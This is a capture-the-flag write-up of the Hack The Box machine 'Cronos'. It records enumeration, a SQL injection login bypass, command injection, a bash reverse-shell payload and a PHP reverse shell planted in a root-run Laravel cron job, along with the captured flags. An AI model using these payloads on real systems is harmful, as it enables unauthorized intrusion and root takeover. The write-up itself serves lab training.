# HTB: Cronos

## Engagement Overview

**Target:** Cronos  
**Box IP:** 10.10.10.13   
**Local IP:** 10.10.14.10   
**Date:** 2025-07-12  

---

### Objectives

- Exploit SQL injection vulnerability
- Achieve shell access and escalate to root via cron job abuse

---

## Service Enumeration

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

- **Gobuster:** No useful results  
- **DNS Info (dig):**
  ```
  cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb.
  ```

---

## Exploitation

### Initial Access

**Vulnerability:**  
- SQL Injection on `admin.cronos.htb` login form  
- Payload: `' OR 1=1-- -`  

**Confirmation:**  
Ping test to attacker IP succeeded:
```
PING 10.10.14.10 (10.10.14.10): 64 bytes from 10.10.14.10: time=43.6 ms
```

**Command Injection:**  
Using Burp Suite Repeater:
```
command=ls+-l&host=/var/www
```
Response:
```
drwxr-xr-x  2 www-data www-data 4096 May 10 2022 admin
drwxr-xr-x  2 www-data www-data 4096 May 10 2022 html
drwxr-xr-x 13 www-data www-data 4096 May 10 2022 laravel
```

**Reverse Shell Payload:**  
```bash
command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.24/443+0>%261'%26host=
```

Shell acquired as `www-data`.

---

## Privilege Escalation

### Enumeration
- Discovered cron job running Laravel scheduler:
  ```
  * * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
  ```

### Exploitation
- Poisoned artisan job to execute PHP reverse shell:
```php
$sock=fsockopen("10.10.14.10", 443);
exec("/bin/sh -i <&3 >&3 2>&3");
```

- Shell established as `root`.

---

## House Cleaning
- Removed:
  - `linpeas.sh`
  - Malicious code from Laravel artisan
- No additional uploads or tools left behind

---

## Post-Exploitation

### Credentials & Flags
- `user.txt`: `e053208bdfc3ad87d7d492285a15512a`  
- `root.txt`: `d800ebbbb59fee6c01e6e2f208e41416`

---

## Tools Utilized
- Burp Suite
- linPEAS
- netcat / listener

---

## Key Takeaways
- linPEAS highlighted numerous other potential vulnerabilities, but only the cron job was exploited
- This box served as good hands-on training for:
  - Manual SQL injection
  - Laravel-based cron job abuse
  - Gaining shell via Burp Suite command injection